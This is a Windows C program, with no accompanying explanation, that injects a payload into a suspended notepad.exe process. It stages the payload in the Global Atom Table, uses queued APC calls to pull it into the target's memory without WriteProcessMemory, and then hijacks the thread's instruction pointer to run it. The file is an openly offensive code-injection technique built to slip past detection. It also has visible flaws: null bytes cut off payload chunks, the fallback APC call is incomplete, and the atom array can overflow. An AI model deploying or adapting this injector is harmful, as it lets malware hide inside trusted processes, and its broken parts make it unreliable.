#include <windows.h>
#include <stdio.h>
#include "../common/payload.h"

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef NTSTATUS (NTAPI *pfnNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

int main() {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // 1. Create target process in suspended state
    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }

    // 2. Allocate buffer in target process (RW) without WriteProcessMemory
    LPVOID pRemoteBuf = VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // 3. Store payload chunks into Global Atom Table
    // Atom names are null-terminated strings
    char chunk[128];
    DWORD bytesWritten = 0;
    ATOM atoms[16];
    int atomCount = 0;

    while (bytesWritten < payload_len) {
        DWORD chunkSize = payload_len - bytesWritten;
        if (chunkSize > 64) chunkSize = 64;

        memset(chunk, 0, sizeof(chunk));
        memcpy(chunk, payload + bytesWritten, chunkSize);

        ATOM a = GlobalAddAtomA(chunk);
        if (!a) break;
        atoms[atomCount++] = a;
        bytesWritten += chunkSize;
    }

    // 4. Resolve addresses needed for target process execution
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pGlobalGetAtomNameA = GetProcAddress(hKernel32, "GlobalGetAtomNameA");
    FARPROC pVirtualProtect = GetProcAddress(hKernel32, "VirtualProtect");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtQueueApcThread NtQueueApcThread = (pfnNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");

    // 5. Cross-process delivery via APC:
    // Queue APC calls to GlobalGetAtomNameA in the target process
    // This forces target to pull data from Global Atom Table into its own memory without WPM
    BYTE* remoteWritePtr = (BYTE*)pRemoteBuf;
    for (int i = 0; i < atomCount; i++) {
        if (NtQueueApcThread) {
            // Target calls: GlobalGetAtomNameA(atoms[i], remoteWritePtr, 128)
            NtQueueApcThread(pi.hThread, (PVOID)pGlobalGetAtomNameA, (PVOID)(ULONG_PTR)atoms[i], (PVOID)remoteWritePtr, (PVOID)128);
        } else {
            QueueUserAPC((PAPCFUNC)pGlobalGetAtomNameA, pi.hThread, (ULONG_PTR)atoms[i]);
        }
        remoteWritePtr += 64;
    }

    // 6. Resume target to execute APCs reading the atoms
    ResumeThread(pi.hThread);
    Sleep(500);

    // 7. Change protection to executable and hijack execution
    SuspendThread(pi.hThread);

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, pRemoteBuf, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(pi.hThread, &ctx);

#if defined(_WIN64)
    ctx.Rip = (DWORD64)pRemoteBuf;
#else
    ctx.Eip = (DWORD)pRemoteBuf;
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    // Cleanup atoms
    for (int i = 0; i < atomCount; i++) {
        GlobalDeleteAtom(atoms[i]);
    }

    WaitForSingleObject(pi.hThread, 3000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
